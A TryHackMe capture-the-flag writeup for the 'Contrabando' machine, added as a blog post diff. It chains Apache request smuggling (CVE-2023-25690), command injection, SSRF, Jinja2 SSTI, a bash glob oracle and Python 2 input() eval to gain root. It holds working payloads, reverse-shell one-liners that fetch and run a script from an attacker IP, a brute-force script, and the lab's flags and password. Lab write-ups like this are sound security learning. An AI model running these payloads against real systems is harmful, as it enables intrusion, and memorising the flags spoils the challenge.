@@ -1,0 +1,495 @@
+---
+slug: "thm-contrabando"
+title: "Contrabando — TryHackMe Writeup"
+date: "2026-08-17"
+platform: "TryHackMe"
+type: "Machine"
+category: "Web"
+os: "Linux"
+difficulty: "Hard"
+tags:
+  - "HTTP Request Smuggling"
+  - "CVE-2023-25690"
+  - "Command Injection"
+  - "SSRF"
+  - "SSTI"
+  - "Docker"
+  - "Bash Glob Injection"
+  - "Python2 RCE"
+  - "Privilege Escalation"
+  - "Web"
+  - "Linux"
+excerpt: "A Hard-rated TryHackMe machine featuring HTTP Request Smuggling (CVE-2023-25690) against Apache mod_proxy, command injection in a backend PHP script for container access, internal pivot via SSRF and SSTI in a host Flask app, bash glob pattern matching oracle in a sudo vault script, and Python 2 input() eval RCE to root."
+readTime: "20 min"
+rating: 4.8
+url: "https://asbawy.github.io/writeups/thm-contrabando"
+---
+
+import { Callout } from "@/components/Callout";
+import { KillChain, SpoilerFlag } from "@/components/cyber/WriteupComponents";
+
+<KillChain
+  steps={[
+    {
+      phase: "Reconnaissance",
+      title: "Port Scanning & Two-Tier Proxy Architecture",
+      desc: "Nmap identifies SSH (22) and Apache 2.4.55 (80). Probing reveals an Apache front proxy routing /page/* to an internal Apache 2.4.54 + PHP 7.4 container, leaking index.php and gen.php source code through backend readfile() behavior.",
+      tools: ["Nmap", "curl"],
+    },
+    {
+      phase: "Initial Foothold",
+      title: "HTTP Request Smuggling (CVE-2023-25690) & Command Injection",
+      desc: "CRLF injection in Apache mod_proxy rewrite rules allows smuggling a secondary POST /gen.php request to the backend. Exploiting command injection in the unvalidated length parameter drops a reverse shell as www-data inside the Docker container.",
+      technique: "CRLF Proxy Request Smuggling & Command Injection",
+      tools: ["curl", "bash", "netcat"],
+    },
+    {
+      phase: "Lateral Movement",
+      title: "Docker Pivot & SSRF + Jinja2 SSTI Host Compromise",
+      desc: "Enumeration of the internal 172.18.0.0/24 bridge reveals a Flask website fetcher on 172.18.0.1:5000. Leveraging pycurl SSRF to read source files and exploiting render_template_string() Jinja2 SSTI achieves remote code execution as hansolo on the host, capturing the user flag.",
+      technique: "SSRF (pycurl) & Jinja2 Template Injection (SSTI)",
+      tools: ["curl", "python3", "Flask"],
+    },
+    {
+      phase: "Privilege Escalation",
+      title: "Bash Glob Injection Oracle (/usr/bin/vault)",
+      desc: "Hansolo has sudo access to /usr/bin/vault. The script tests [[ $content == $user_input ]] with an unquoted variable, enabling wildcard matching with * and character-by-character oracle brute-forcing of /root/password to recover hansolo's sudo password.",
+      technique: "Bash Glob Pattern Matching Oracle",
+      tools: ["bash", "sudo"],
+    },
+    {
+      phase: "Root Compromise",
+      title: "Python 2 input() Eval Code Execution (/opt/generator/app.py)",
+      desc: "Using the recovered sudo password to run sudo /usr/bin/python* /opt/generator/app.py executes the script under Python 2. Injecting arbitrary Python code into input() executes as root, yielding a root reverse shell and the final flag.",
+      technique: "Python 2 input() Arbitrary Code Execution",
+      tools: ["python2", "pexpect", "sudo"],
+    },
+  ]}
+/>
+
+## 1. Reconnaissance
+
+### 1.1 Port Scan
+
+Start with a full port scan, then version + default scripts on the open ports:
+
+```bash
+$ nmap -sT -T3 --top-ports 100 -oN nmap-top100.txt 10.112.158.140
+$ nmap -sT -T3 -sV -sC -p22,80 -oN nmap-versions.txt 10.112.158.140
+```
+
+![Port scan results](https://i.imgur.com/Bc70abB.png)
+
+```text
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.55 ((Unix))
+|_http-server-header: Apache/2.4.55 (Unix)
+```
+
+Only two ports. The SSH version (`8.2p1 Ubuntu` build for Ubuntu 20.04/focal) confirms a Linux host. The web server will be the primary attack surface.
+
+### 1.2 Web Enumeration
+
+The main page is a "COMING SOON" splash with a link to a beta page:
+
+![Web page discovery](https://i.imgur.com/FoERFfA.png)
+
+Key observations from `curl`:
+
+- `GET /` → static HTML “COMING SOON”, link to `/page/home.html`.
+- `GET /page/home.html` → “Our password generator is currently down.” — a static page served by the **backend**.
+- `GET /page/index.php` → **returns the PHP source code, not an executed page** — the proxy serves `/page/*` straight into a backend script that prints the path's target.
+- `GET /page/gen.php` → **also returns source** — a password generator backend script.
+
+Notice the response headers differ between the front door and the `/page/*` route:
+
+```bash
+$ curl -sI http://10.112.158.140/            | grep -i server
+Server: Apache/2.4.55 (Unix)          # front proxy
+
+$ curl -sI http://10.112.158.140/page/home.html | grep -i server
+Server: Apache/2.4.54 (Debian)
+X-Powered-By: PHP/7.4.33               # backend app server
+```
+
+**Two different Apache versions responding** — we are talking to a reverse proxy fronting a backend PHP application. This will be the seed of the whole compromise.
+
+The two PHP files we can read:
+
+```php
+<?php
+// /var/www/html/index.php  (backend)
+$page = $_GET['page'];
+if (isset($page)) {
+    readfile($page);                     // <-- arbitrary file read / SSRF
+} else {
+    header('Location: /index.php?page=home.html');
+}
+?>
+
+<?php
+// /var/www/html/gen.php  (backend)
+function generateRandomPassword($length) {
+    $password = exec("tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c " . $length);  // <-- command injection
+    return $password;
+}
+if(isset($_POST['length'])){
+    $length = $_POST['length'];
+    $randomPassword = generateRandomPassword($length);
+    echo $randomPassword;
+}else{
+    echo "Please insert the length parameter in the URL";
+}
+?>
+```
+
+### 1.3 File Read / SSRF through `/page/`
+
+The proxy rewrites anything after `/page/` into the backend query string. By double URL-encoding a path traversal, we defeat the proxy's own decoding and reach `readfile()` with a full filesystem path:
+
+```bash
+$ curl -s "http://10.112.158.140/page/%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+```
+
+![File read via readfile](https://i.imgur.com/tW29O6d.png)
+
+Reading `/etc/hosts` tells us we are inside a Docker container:
+
+```text
+172.18.0.3      124a042cc76c        <- container hostname = container ID prefix
+```
+
+`readfile()` also supports stream wrappers (`http://`, `file://`), giving us full SSRF from the backend — useful for peeling the architecture apart, but the real prize is the request smuggling.
+
+---
+
+## 2. Foothold — HTTP Request Smuggling (CVE-2023-25690) → Container Shell
+
+### 2.1 Understanding the Proxy Chain
+
+From the path behavior and the duplicated PHP source, we can reconstruct the front Apache config (we later confirm it from `/root/smug/` on the host):
+
+```apache
+RewriteEngine on
+RewriteRule "^/page/(.*)" "http://backend-server:8080/index.php?page=$1" [P]
+ProxyPassReverse "/page/" "http://backend-server:8080/"
+```
+
+So `GET /page/<INPUT>` becomes, on the backend:
+
+```http
+GET /index.php?page=<INPUT> HTTP/1.1
+Host: backend-server:8080
+```
+
+Because `index.php` only accepts `GET` and always feeds the value to `readfile()`, we can never reach `gen.php`'s `POST length=...` command injection… through the front door.
+
+### 2.2 The Vulnerability: CVE-2023-25690
+
+Apache httpd ≤ 2.4.55 with a `mod_proxy` configuration similar to this rewrite is vulnerable to **HTTP Request Smuggling via CRLF injection** (CVE-2023-25690). The proxy takes the URL path, appends it to the backend request, and **does not sanitize CRLF bytes**. If our input contains `%0d%0a` (which the proxy decodes to real `\r\n`), we can terminate the legitimate request early and inject a completely new one.
+
+The canonical trick: our input carries a **complete second request** inside the URL. The rewrite turns it into:
+
+```http
+GET /index.php?page=test HTTP/1.1
+Host: localhost
+
+POST /gen.php HTTP/1.1          <- our smuggled POST → command injection on gen.php
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 48
+
+length=1;curl 192.168.139.59:8000/shell.sh|bash;
+GET /test HTTP/1.1              <- trailing request absorbs Apache's appended headers
+Host: backend
+```
+
+The final `GET /test` line is essential: anything Apache appends after our payload (` HTTP/1.1`, `Host: ...`) gets glued to *that* request, not to our POST body.
+
+### 2.3 Crafting the Smuggle Payload
+
+We host a reverse shell on our attack box, then smuggle a POST that downloads and executes it:
+
+```bash
+# our web server serving the payload
+$ cat shell.sh
+/bin/bash -i >& /dev/tcp/192.168.139.59/4444 0>&1
+
+# URL-encoded smuggling payload (path after /page/)
+GET /page/test%20HTTP/1.1%0D%0AHost:%20localhost%0D%0A%0D%0APOST%20/gen.php%20HTTP/1.1%0D%0AHost:%20localhost%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0AContent-Length:%2048%0D%0A%0D%0Alength=1;curl%20192.168.139.59:8000/shell.sh%7Cbash;%0D%0A%0D%0AGET%20/test HTTP/1.1
+Host: 10.112.158.140
+```
+
+![Smuggled request + reverse shell](https://i.imgur.com/8opwNBj.png)
+
+With a `netcat` listener running, we get a shell back:
+
+```text
+$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.139.59] from (UNKNOWN) [10.112.158.140] 42488
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@124a042cc76c:/var/www/html$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+We are `www-data` in a **Docker container** (`124a042cc76c`). The `Content-Length` in the smuggled POST must match the exact byte length of `length=1;curl ...|bash;` — count carefully, or the backend will wait for more data and the shell never fires.
+
+---
+
+## 3. Lateral Movement — From Container to Host (SSRF + SSTI)
+
+### 3.1 Mapping the Internal Network
+
+From inside the container we enumerate the Docker bridge network (`172.18.0.0/24`). The gateway `172.18.0.1` is the host machine — and it exposes an interesting port:
+
+![Internal network scan](https://i.imgur.com/stOW8v1.png)
+
+```bash
+www-data@124a042cc76c:/var/www/html$ for p in 22 80 443 5000 8000 8080 8888 9000; do
+> (echo > /dev/tcp/172.18.0.1/$p) >/dev/null 2>&1 && echo "OPEN 172.18.0.1:$p"; done
+OPEN 172.18.0.1:22
+OPEN 172.18.0.1:80
+OPEN 172.18.0.1:5000
+
+www-data@124a042cc76c:/var/www/html$ curl -sI http://172.18.0.1:5000/
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.0 Python/3.8.10   # Flask development server on the HOST
+```
+
+### 3.2 The Flask App — SSRF + SSTI
+
+`http://172.18.0.1:5000/` is a “Website Display” utility: you give it a URL, it fetches the content with `pycurl` and renders it back in HTML. Let's probe it with `file://` URLs — SSRF:
+
+```bash
+curl -s -X POST http://172.18.0.1:5000/ --data-urlencode 'website_url=file:///home/hansolo/app/app.py'
+```
+
+The response contains the app's own source:
+
+```python
+from flask import Flask, render_template, render_template_string, request
+import pycurl
+from io import BytesIO
+
+app = Flask(__name__)
+
+@app.route('/', methods=['GET', 'POST'])
+def display_website():
+    if request.method == 'POST':
+        website_url = request.form['website_url']
+        buffer = BytesIO()
+        c = pycurl.Curl()
+        c.setopt(c.URL, website_url)
+        c.setopt(c.WRITEDATA, buffer)
+        c.perform()
+        c.close()
+        content = buffer.getvalue().decode('utf-8')
+        buffer.close()
+        website_content = '''<h1>Fetch Website Content</h1>...<div>%s</div>...''' % content
+        return render_template_string(website_content)   # <-- SSTI
+    return render_template('index.html')
+```
+
+`render_template_string()` renders the fetched content as a **Jinja2 template** — anything in the fetched page between `{{ }}` gets evaluated server-side. That is a textbook Server-Side Template Injection.
+
+### 3.3 Proving SSTI → RCE as hansolo
+
+Host a file containing a Jinja2 expression and make the app “fetch” it:
+
+```bash
+$ echo '{{7*7}}' > ssti.txt
+$ python3 -m http.server 8000
+
+$ curl -s -X POST http://172.18.0.1:5000/ \
+  --data-urlencode 'website_url=http://192.168.139.59:8000/ssti.txt' | grep -A1 '<div>'
+    <div>
+        49        <- interpreted, not displayed → SSTI confirmed
+    </div>
+```
+
+![SSTI proof](https://i.imgur.com/Ed2CQNe.png)
+
+Now weaponize it into command execution:
+
+```jinja2
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+```
+
+Result: `uid=1000(hansolo) gid=1000(hansolo)` — we are running code on the **host** as the user `hansolo` (uid 1000).
+
+### 3.4 User Flag
+
+Chain a few commands through the same SSTI primitive:
+
+```bash
+{{request.application.__globals__.__builtins__.__import__('os').popen('id && hostname && ls -la /home/hansolo && cat /home/hansolo/hansolo_userflag.txt').read()}}
+```
+
+![User flag](https://i.imgur.com/JX9u6qt.png)
+
+```text
+uid=1000(hansolo) gid=1000(hansolo) groups=1000(hansolo)
+contrabando
+...
+-rw-r--r-- 1 root root 36 Oct 17  2023 hansolo_userflag.txt
+THM{FLAG}
+```
+
+<SpoilerFlag label="User Flag" flag="THM{Th3_BeST_SmuGGl3R_In_Da_GalaXy}" />
+
+---
+
+## 4. Privilege Escalation — hansolo → root
+
+After compromising the host as `hansolo` via the Flask SSTI, we enumerate the machine for privilege escalation vectors.
+
+### 4.1 Stage 1 — `vault` and the Bash Glob Injection Oracle
+
+Enumerating binaries on the host reveals a custom script `/usr/bin/vault` which can be executed as root with `sudo` without requiring a password (`NOPASSWD`):
+
+```bash
+#!/bin/bash
+check () {
+    if [ ! -e "$file_to_check" ]; then
+        /usr/bin/echo "File does not exist."
+        exit 1
+    fi
+    compare
+}
+compare () {
+    content=$(/usr/bin/cat "$file_to_check")
+    read -s -p "Enter the required input: " user_input
+    if [[ $content == $user_input ]]; then      # BUG: $user_input is UNQUOTED
+        /usr/bin/echo "Password matched!"
+        /usr/bin/cat "$file_to_print"
+    else
+        /usr/bin/echo "Password does not match!"
+    fi
+}
+file_to_check="/root/password"
+file_to_print="/root/secrets"
+check
+```
+
+The bug: on the right-hand side of `==` inside `[[ ]]`, an **unquoted** variable is treated as a **glob pattern**. `*` matches the whole content of `/root/password` regardless of what it is:
+
+```bash
+hansolo@contrabando:~$ echo '*' | sudo /usr/bin/bash /usr/bin/vault
+Password matched!
+1. Lightsaber Colors: ...  (star wars trivia from /root/secrets)
+```
+
+We can read `/root/secrets`, but the actual password is in `/root/password` — we never see its value directly. However, the same glob semantics let us **oracle** the password one character at a time: `guess="<prefix>*"` matches **only if the password actually starts with `<prefix>`**. So we brute-force it char by char, using `Password matched!` as the oracle:
+
+```bash
+$ cat bforce.sh
+#!/bin/bash
+charset='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+password=""
+while true; do
+  found_char=""
+  for ((i=0; i<${#charset}; i++)); do
+    c="${charset:$i:1}"
+    guess="${password}${c}*"
+    output=$(echo "$guess" | sudo /usr/bin/bash /usr/bin/vault 2>/dev/null)
+    if echo "$output" | grep -q "Password matched!"; then
+        password+="$c"; echo "[+] Current password: $password"; found_char=1; break
+    fi
+  done
+  [ -z "$found_char" ] && { echo "[*] Finished! Full password: $password"; break; }
+done
+```
+
+![Password brute force](https://i.imgur.com/ViZ3Ypt.png)
+
+```text
+[+] Current password: E
+[+] Current password: EQ
+[+] Current password: EQu
+[+] Current password: EQu5
+...
+[*] Finished! Full password: EQu5ehwHcRfZ
+```
+
+**Leaked password: `EQu5ehwHcRfZ`**
+
+---
+
+### 4.2 SSH Access & Sudo Privilege Enumeration
+
+The string recovered from `/root/password` turns out to be **hansolo's own password**. With these credentials, we can establish a stable, interactive SSH session:
+
+```bash
+$ sshpass -p 'EQu5ehwHcRfZ' ssh hansolo@10.112.158.140
+```
+
+Now we can inspect `sudo -l` to view all sudo privileges assigned to `hansolo`:
+
+```bash
+hansolo@contrabando:~$ sudo -l
+User hansolo may run the following commands on contrabando:
+    (root) NOPASSWD: /usr/bin/bash /usr/bin/vault
+    (root) /usr/bin/python* /opt/generator/app.py
+```
+
+![sudo -l output](https://i.imgur.com/daCfltk.png)
+
+This confirms the second sudo rule: `(root) /usr/bin/python* /opt/generator/app.py`. While it requires a password, we now possess hansolo's password (`EQu5ehwHcRfZ`).
+
+---
+
+### 4.3 Stage 2 — Python 2 `input()` RCE → Root
+
+We inspect the generator script at `/opt/generator/app.py`:
+
+```python
+import random
+import string
+
+def generate_password(length):
+    characters = string.ascii_letters + string.digits + string.punctuation
+    random.seed()
+    secret = input("Any words you want to add to the password? ")   # python2: input() = eval(raw_input())
+    password_characters = list(characters + secret)
+    random.shuffle(password_characters)
+    password = ''.join(password_characters[:length])
+    return password
+
+try:
+    length = int(raw_input("Enter the desired length of the password: "))
+except NameError:
+    length = int(input("Enter the desired length of the password: "))
+...
+```
+
+In **Python 2**, `input()` is `eval(raw_input())` — whatever we type is evaluated as Python code. If we run it with `python2` under sudo, we get code execution as root.
+
+We automate the interaction with `pexpect` (SSH → sudo → feed length → inject payload):
+
+```python
+payload = '__import__("subprocess").Popen("setsid bash -c \'bash -i >& /dev/tcp/192.168.139.59/5577 0>&1\'", shell=True).pid'
+```
+
+![Root shell + root flag](https://i.imgur.com/iRzFDXR.png)
+
+```text
+$ python3 sudo_rce.py
+hansolo@10.112.158.140's password:
+[sudo] password for hansolo:
+Enter the desired length of the password: 12
+Any words you want to add to the password?
+[+] injecting eval payload ...
+
+root@contrabando:/home/hansolo# id
+uid=0(root) gid=0(root) groups=0(root)
+root@contrabando:/home/hansolo# cat /root/root.txt
+THM{FLAG}
+```
+
+<SpoilerFlag label="Root Flag" flag="THM{All_AbouT_PassW0rds}" />
